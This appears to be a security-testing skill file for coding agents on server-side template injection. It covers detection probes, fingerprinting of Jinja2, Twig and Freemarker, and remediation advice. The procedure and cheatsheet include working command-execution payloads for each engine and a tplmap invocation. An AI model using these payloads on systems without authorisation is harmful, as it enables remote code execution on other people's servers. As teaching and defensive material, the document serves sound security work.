---
format: "v2"
name: "ssti-testing"
title: "Ssti Testing"
title_fr: "Tests SSTI (Server-Side Template Injection)"
description: "Use when user input reaches a server-side template engine — testing for template injection that can escalate to remote code execution, and how to render untrusted data safely."
description_fr: "À utiliser quand une entrée utilisateur atteint un moteur de template côté serveur — pour tester l'injection de template pouvant escalader jusqu'à l'exécution de code à distance, et comment restituer des données non fiables en toute sécurité."
domain: "03-web-application-security"
tags: [cybersecurity, engineering, best-practices]
maturity: "stable"
audience: ["backend-engineer", "security-engineer", "coding-agent"]
requires: ["bash", "git"]
updated: "2026-08-08"
---



## Prerequisites
- Target system, dependencies and environment configured.

## Usage
### Purpose

Server-Side Template Injection happens when user input is embedded into a template that the server then evaluates — so the input isn't just displayed, it's executed by the template engine. Depending on the engine, that ranges from information disclosure to full remote code execution. This skill covers detecting SSTI, identifying the engine, and the rendering discipline that prevents it.

### When to use it

Wherever user input might be concatenated into a template rather than passed as data: customisable emails, templated pages, "personalised" messages, error pages that echo input, anything where the app builds output with a template engine (Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars, etc.).

### Procedure

1. Find inputs that come back rendered in the page. Inject a **mathematical probe** that only a template engine would evaluate — if `7*7` becomes `49`, the input is being executed, not just echoed:
   ```
   ${7*7}    {{7*7}}    <%= 7*7 %>    #{7*7}
   ```
   `49` in the response = SSTI. Plain `7*7` echoed back = just reflection (test for XSS instead).
2. **Identify the engine** — the exploitation path is engine-specific. Use a decision probe that behaves differently per engine, or the classic polyglot, and observe which syntax evaluates:
   ```
   ${7*7} -> Freemarker/Velocity    {{7*7}} -> Jinja2/Twig/Handlebars
   {{7*'7'}} -> 7777777 (Jinja2)  vs  49 (Twig)
   ```
3. Once the engine is known, escalate carefully toward its **sandbox escape / object access** to prove impact. The goal is demonstrating code execution, not running destructive commands — use a benign proof like reading a config value or `id`:
   ```
   # Jinja2 (Python) — reach the object model to run a command
   {{ self.__init__.__globals__.__builtins__.import('os').popen('id').read() }}
   ```
4. Automate engine detection and exploitation once you've confirmed manually:
   ```
   tplmap -u 'https://app.tld/page?name=*'
   ```
5. Establish blast radius: SSTI with a reachable object model is usually RCE; a heavily sandboxed engine may limit you to data disclosure. Report the confirmed level, not the theoretical worst case.

### Cheatsheet

```
detection (does math evaluate?)
  {{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   -> 49 means SSTI

engine fingerprint
  {{7*'7'}}  -> 7777777 : Jinja2 (Python)
             -> 49      : Twig (PHP)
  ${7*7} evaluates      : Freemarker / Velocity (Java)
  <%= 7*7 %>            : ERB (Ruby)

proof-of-impact (benign command, authorised targets only)
  Jinja2:     {{ cycler.__init__.__globals__.os.popen('id').read() }}
  Twig:       {{ ['id']|filter('system') }}
  Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}

automated:  tplmap -u 'https://app.tld/page?name=*'
```

### Reading the output

- **`49` (or `7777777`) in the response** = confirmed SSTI; the engine is evaluating your input. This is the key signal.
- **The engine fingerprint** tells you the ceiling: a Python/Java engine with object access usually means RCE; a locked-down logic-less engine (some Handlebars configs) may cap you at data disclosure.
- **A benign command returning output** (`id`, a config value) = proven code execution — report as critical, no need to run anything harmful.
- **Math echoed literally (`7*7`)** = not SSTI; it's reflection, so pivot to XSS testing instead.

### The fix

The root cause is untrusted input used as part of the template, not as data passed to it.

- **Never build templates from user input.** Pass user data as **variables/context** into a static, developer-authored template — the engine then treats it as data, never as template code. `render(template, name=user_input)`, not `render(f"Hello {user_input}")`.
- If users genuinely must supply templates (rare), use a **logic-less, sandboxed engine** designed for untrusted input, and keep dangerous objects/functions out of the context. Treat the sandbox as reducing risk, not eliminating it — engine sandboxes have a history of escapes.
- Apply normal **output encoding** for the XSS layer on top (a fixed template still needs to escape the data it renders).
- Run the app with least privilege so a missed case yields the smallest possible foothold.

### Pitfalls

- **Confusing SSTI with XSS.** If `7*7` isn't evaluated, it's not SSTI. The math probe is the discriminator.
- **Running destructive proofs.** You don't need to do damage to prove RCE — a benign command output is sufficient and safe.
- **Trusting a template sandbox.** Sandboxes get escaped; don't rely on one as the sole control for user-supplied templates.
- **Fixing with output encoding alone.** Encoding stops XSS but not template *evaluation* — the input must not reach the template as code in the first place.

### References

- OWASP WSTG-INPV-18 (Testing for Server-Side Template Injection)
- PortSwigger Web Security Academy — SSTI
- CWE-1336, CWE-94
- tplmap documentation

## Inputs
- Relevant source code, logs, network traces, or system specifications.

## Outputs
- Analysis findings, security audit report, or generated code artifacts.